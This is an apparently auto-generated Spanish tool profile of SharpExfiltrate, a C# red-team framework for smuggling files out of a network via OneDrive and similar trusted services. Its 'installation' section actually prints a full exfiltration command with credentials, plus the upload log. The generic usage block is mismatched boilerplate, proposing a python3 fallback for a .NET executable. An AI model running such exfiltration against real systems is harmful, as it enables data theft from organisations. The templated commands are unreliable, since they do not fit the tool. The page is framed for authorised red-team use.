---
title: "SharpExfiltrate: Modular C# framework to exfiltrate loot over secure and trusted channels"
slug: "sharpexfiltrate"
summary: "Modular C# framework to exfiltrate loot over secure and trusted channels."
category: "ciberseguridad"
level: "Intermedio"
reading: 6
tags: ['exfiltration', 'red-team']
updated: "2026-11-01"
featured: false
order: 999
---

## Qué es SharpExfiltrate

SharpExfiltrate es una herramienta de seguridad ofensiva / red team. Modular C# framework to exfiltrate loot over secure and trusted channels.

Forma parte del ecosistema de herramientas de adversary simulation y es útil para comprender cómo operan los atacantes y cómo detectar sus técnicas.

- **Repositorio oficial:** [https://github.com/Flangvik/SharpExfiltrate](https://github.com/Flangvik/SharpExfiltrate)
- **Sección del toolkit:** Exfiltration 

## Objetivo y función

El objetivo principal de SharpExfiltrate es modular c# framework to exfiltrate loot over secure and trusted channels.

En un engagement de red team, esta herramienta se usa para automatizar o simplificar una fase concreta del ataque (reconocimiento, acceso inicial, movimiento lateral, evasión, etc.), reduciendo el tiempo manual y aumentando la cobertura.

## Instalación

```
.\SharpExfiltrate.exe OneDrive --username <redacted> --password "<redacted>" --filepath "C:\Users\<redacted>\Downloads\balenaEtcher-Setup-1.5.120.exe"

  __  _  _  __  ___ ___ _____   _____ _ _ _____ ___  __ _____ ___
/' _/| || |/  \| _ \ _,\ __\ \_/ / __| | |_   _| _ \/  \_   _| __|
`._`.| >< | /\ | v / v_/ _| > , <| _|| | |_| | | v / /\ || | | _|
|___/|_||_|_||_|_|_\_| |___/_/ \_\_| |_|___|_| |_|_\_||_||_| |___|
@Flangvik - TrustedSec

[+] Compressing C:\Users\<redacted>\Downloads\balenaEtcher-Setup-1.5.120.exe 140,8MB
[+] Password for Zip file is be4886d6a9004ed
[+] Launching OneDrive module by @Flangvik
[+] Performing Authentication using provided credentials
[+] Confirming access to https://graph.windows.net
[+] Starting OneDrive upload
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (7%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (14%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (28%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (35%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (64%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (71%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (85%)
[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB -
...


## Uso básico

Consulta el README oficial para la sintaxis exacta. Un flujo típico:

```bash
# Clonar
git clone https://github.com/Flangvik/SharpExfiltrate
cd sharpexfiltrate

# Revisar ayuda
./sharpexfiltrate --help 2>/dev/null || python3 -m sharpexfiltrate --help 2>/dev/null || true
```

> Adapta los comandos a tu entorno. Muchas de estas herramientas requieren privilegios elevados o sistemas Windows/Active Directory.

## ¿Se puede usar en Termux?

Esta herramienta está pensada para Windows, .NET o entornos de Active Directory. No se instala de forma nativa en Termux; úsala desde una máquina virtual, un contenedor o un laboratorio con Windows/Linux completo.

## Buenas prácticas y ética

Usa SharpExfiltrate únicamente en entornos que poseas o para los que tengas autorización escrita. El uso no autorizado es ilegal. En laboratorios, monta una VM aislada y una red de pruebas.

## Referencias

- Repositorio: https://github.com/Flangvik/SharpExfiltrate
- Toolkit de origen: Red Teaming Toolkit
